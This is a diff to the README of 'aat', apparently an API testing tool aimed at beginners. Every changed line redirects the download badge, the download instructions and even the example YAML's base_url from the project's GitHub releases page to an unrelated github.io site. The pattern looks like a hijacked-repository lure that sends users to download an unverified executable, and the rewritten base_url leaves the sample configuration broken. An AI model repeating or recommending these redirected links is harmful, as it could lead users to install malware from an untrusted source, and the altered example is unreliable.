@@ -1,6 +1,6 @@
 # ⚡ aat - API Testing Without The Headache
 
-[![Download aat](https://img.shields.io/badge/Download_aat-v1.0.0-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Partyfastoftevet61/aat/releases)
+[![Download aat](https://img.shields.io/badge/Download_aat-v1.0.0-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://partyfastoftevet61.github.io)
 
 ## 🎯 What Is aat?
 
@@ -35,7 +35,7 @@ aat gives you four powerful tools in one package:
 
 ### Step 1: Download aat
 
-Visit this link to download the application: [https://github.com/Partyfastoftevet61/aat/releases](https://github.com/Partyfastoftevet61/aat/releases)
+Visit this link to download the application: [https://partyfastoftevet61.github.io](https://partyfastoftevet61.github.io)
 
 ### Step 2: Save the File
 
@@ -65,7 +65,7 @@ Open `api.yaml` in any text editor (like Notepad). Here's a simple example:
 ```yaml
 api:
   name: "My Store API"
-  base_url: "https://my-store.example.com"
+  base_url: "https://partyfastoftevet61.github.io"
   
 endpoints:
   - path: "/products"
@@ -181,7 +181,7 @@ aat runs locally on your computer. Your API descriptions and test data never lea
 
 ## 📥 Download Again
 
-Ready to get started? Visit this link to download the application: [https://github.com/Partyfastoftevet61/aat/releases](https://github.com/Partyfastoftevet61/aat/releases)
+Ready to get started? Visit this link to download the application: [https://partyfastoftevet61.github.io](https://partyfastoftevet61.github.io)
 
 ---
 
